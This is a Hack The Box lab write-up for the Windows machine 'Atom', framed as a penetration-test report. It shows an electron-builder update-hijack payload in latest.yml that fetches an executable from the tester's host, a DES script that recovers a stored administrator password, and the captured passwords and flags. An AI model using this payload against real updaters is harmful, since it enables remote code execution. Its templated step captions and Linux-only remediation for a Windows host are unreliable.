---
title: "OffSec Assessment: Atom (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Atom (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_01.png"
---

# Offensive Security Assessment Report: Atom

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Atom** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Public-Facing Network Service Exploitation
* **Privilege Escalation Vector:** Local Privilege Escalation
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Atom |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Difficulty Rating** | Medium |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Public-Facing Network Service Exploitation |
| **Privilege Escalation Vector** | Local Privilege Escalation |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Public-Facing Network Service Exploitation
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Local Privilege Escalation
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

> **Assessment Query / Target Milestone:** On what port does Atom have a service listening that is an in-memory key-value database?

* **Observed Evidence / Output:** 6379


![step_01.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.


**According to the Internal QA Documentation, to initiate the QA process, place the updated in one of the _________ folders.**

* **Observed Evidence / Output:** client 


![step_02.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.



![step_03.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.


**When installed on a Windows host, to what domain does the Heed application reach out for updates?**

* **Observed Evidence / Output:** updates.atom.htb


![step_04.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_05.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the relative path on `updates.atom.htb` for the YAML file that the application attempts to get?

* **Observed Evidence / Output:** latest.yml


![step_06.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx

f="$(find . -path '*$PLUGINSDIR/app-64.7z' | head -n 1)"
echo "[*] bundle: $f"
[ -z "$f" ] && echo "[x] No encontré $PLUGINSDIR/app-64.7z" && exit 1


7z x "$f" -oapp64 >/dev/null



> **Assessment Query / Target Milestone:** find app64 -iname 'app-update.yml' -print -exec sh -c 'echo "==== {} ===="; sed -n "1,120p" "{}"' \;



> **Assessment Query / Target Milestone:** find app64 -iname 'app.asar' -o -iname '*.asar'



ASAR="$(find app64 -iname 'app.asar' | head -n1)"
if [ -n "$ASAR" ]; then
  mkdir -p app_unpacked
  npx --yes asar extract "$ASAR" app_unpacked
  # Busca cadenas de actualización dentro del código
  rg -n -i 'updates\.atom\.htb|app-update\.yml|latest\.yml|client' app_unpacked || \
  grep -RniE 'updates\.atom\.htb|app-update\.yml|latest\.yml|client' app_unpacked
fi


APPYML="$(find app64 app_unpacked -iname 'app-update.yml' | head -n1)"
if [ -n "$APPYML" ]; then
  BASE_URL="$(awk -F: '/^\s*url:\s*/{sub(/^[[:space:]]+/,"",$2); gsub(/[[:space:]\r]/,"",$2); print $2; exit}' "$APPYML")"
  echo "[+] BASE_URL = $BASE_URL"
  REL_PATH="/$(echo "$BASE_URL" | sed -E 's~https?://updates\.atom\.htb/?~~')/latest.yml"
  REL_PATH="$(echo "$REL_PATH" | sed 's#//#/#g')"
  echo "[+] Relative path = $REL_PATH"
fi

```

**This tool is built with a solution for packaging and distributing Electron applications with auto-update. What is the name of that solution?**

* **Observed Evidence / Output:** electron-builder


![step_07.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx

7z x 'heedv1 Setup 1.0.0.exe' -oheed_exe >/dev/null
7z x 'heed_exe/$PLUGINSDIR/app-64.7z' -oheed_app >/dev/null
asar extract heed_app/resources/app.asar app_src
grep -RniE 'electron([ -]?builder|[ -]?forge|[ -]?packager)|electron-updater|autoUpdater|publish|nsis|squirrel' app_src

```

**There is a remote code execution vulnerability in applications built with this version of Electron-Builder by messing with two fields `latest.yml` file. One is the `url` field. What is the other?**

* **Observed Evidence / Output:** path


![step_08.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What user is the update server running as?

* **Observed Evidence / Output:** jason

```jsx
version: 1.2.3
path: http://10.10.14.13/s'hell.exe
sha512: f9591dfb72032915d0b00ef68fc7424ec8676f5fc847ea334e5997c55f127b1711169905390a976850862f8e6347c6c2cb9be5c25276670814592540655472d6
```


![step_09.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_10.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_10.png)
* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** Submit the flag located on the jason user's desktop.

* **Observed Evidence / Output:** 198223a783ecef7054f632a8128ab4f2


![step_11.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_11.png)
* **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the password to access Redis?

* **Observed Evidence / Output:** kidvscat_yes_kidvscat


![step_12.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_12.png)
* **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the administrator user's password on Atom?

* **Observed Evidence / Output:** kidvscat_admin_@123


![step_13.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_13.png)
* **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_14.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_14.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


```jsx
import base64
from des import *
hash = base64.b64decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'.encode('utf-8'))
key = DesKey(b"7ly6UznJ")
print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))

```

**Submit the flag located on the administrator user's desktop.**

* **Observed Evidence / Output:** c1c0218bebc9f832da67e8a589afadb9


![step_15.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/atom/images/step_15.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Public-Facing Network Service Exploitation) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
